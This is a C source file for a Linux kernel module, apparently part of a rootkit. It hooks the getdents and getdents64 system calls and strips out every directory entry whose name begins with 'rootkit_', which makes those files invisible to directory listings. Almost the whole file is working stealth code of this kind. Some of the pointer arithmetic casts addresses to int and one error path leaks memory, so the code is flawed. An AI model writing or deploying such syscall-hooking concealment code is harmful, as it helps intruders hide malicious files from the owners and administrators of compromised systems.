#include<linux/slab.h>		// for kmalloc
#include <linux/uaccess.h> 	// for copy_from_user
#include <linux/unistd.h>	// for __NR_getdents64 & __NR_getdents

#include "hack_pi.h"
#include "file_hiding.h"

#define FILES_VISIBLE 0
#define FILES_HIDDEN 1

// Hiding state
int file_hiding_state = FILES_VISIBLE;
char* file_hiding_prefix = NULL;

// Original system call functions

// Function pointers to original syscalls
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

// Function that checks if needle is a prefix of haystack
int is_prefix(char* haystack, char* needle)
{
	char* haystack_ptr = haystack;
	char* needle_ptr = needle;

	printk("\ninside is_prefix\n");
	if (needle == NULL) {
		return 0;
	}
	while (*needle_ptr != '\0') {
		if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
			return 0;
		}
		++haystack_ptr;
		++needle_ptr;
	}
	printk("\nfound rootkit_ prefix\n");
	return 1;
}

asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	int ret;
	struct linux_dirent64* cur = dirp;
	int pos = 0;

	// Call the original function
	// Directory entries will be written to a buffer pointed to by dirp
	ret = original_getdents64 (fd, dirp, count);

	// Iterate through the directory entries
	while (pos < ret) {
		// Check prefix
		if (is_prefix(cur->d_name, file_hiding_prefix)) {
			int err;
			int reclen = cur->d_reclen; // Size of current dirent
			char* next_rec = (char*)cur + reclen; // Address of next dirent
			int len = (int)dirp + ret - (int)next_rec; // Bytes from the next dirent to end of the last
			char* remaining_dirents = kmalloc(len, GFP_KERNEL);

			// Debug message
			//printk("Hiding file %s\n", cur->d_name);

			// Copy the next and following dirents to kernel memory
			err = copy_from_user(remaining_dirents, next_rec, len);
			if (err) {
				continue;
			}
			// Overwrite (delete) the current dirent in user memory
			err = copy_to_user(cur, remaining_dirents, len);
			if (err) {
				continue;
			}
			kfree(remaining_dirents);
			// Adjust the return value;
			ret -= reclen;
			continue;
		}
	// Get the next dirent
	pos += cur->d_reclen;
	cur = (struct linux_dirent64*) ((char*)dirp + pos);
	}
	return ret;
}

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	// Analogous to 64 version
	int ret;
	struct linux_dirent* cur = dirp;
	int pos = 0;
	ret = original_getdents(fd, dirp, count);

	while (pos < ret) {
		if (is_prefix(cur->d_name, file_hiding_prefix)) {
			int reclen = cur->d_reclen;
			char* next_rec = (char*)cur + reclen;
			int len = (int)dirp + ret - (int)next_rec;
			memmove(cur, next_rec, len);
			ret -= reclen;
			continue;
		}
		pos += cur->d_reclen;
		cur = (struct linux_dirent*) ((char*)dirp + pos);
	}
	printk("\ninside hacked_ls\n");
	return ret;
}

void set_file_prefix(char* prefix)
{
	kfree(file_hiding_prefix);
	file_hiding_prefix = kmalloc(strlen(prefix) + 1, GFP_KERNEL);
	strcpy(file_hiding_prefix, prefix);
}

void enable_file_hiding(void)
{
	if (file_hiding_state == FILES_HIDDEN) {
		return;
	}
	//syscall_table_modify_begin();
	//HOOK_SYSCALL(getdents);
	//HOOK_SYSCALL(getdents64);
	//syscall_table_modify_end();
	printk("Enable file hiding...");
	// Hook system calls to our function
	HOOK_SYSCALL(getdents);
	HOOK_SYSCALL(getdents64);

	file_hiding_state = FILES_HIDDEN;
}

void disable_file_hiding(void)
{
	if (file_hiding_state == FILES_VISIBLE) {
		return;
	}
	//syscall_table_modify_begin();
	//RESTORE_SYSCALL(getdents);
	//RESTORE_SYSCALL(getdents64);

	// Restore original functions

	//syscall_table_modify_end();
	printk("Disable file hiding...");
	RESTORE_SYSCALL(getdents);
	RESTORE_SYSCALL(getdents64);

	file_hiding_state = FILES_VISIBLE;
}

void init_file_hiding(void)
{
	printk("Init File Hiding...");	
	set_file_prefix("rootkit_");
	enable_file_hiding();
}

void finalize_file_hiding(void)
{
	disable_file_hiding();
	kfree(file_hiding_prefix);
}
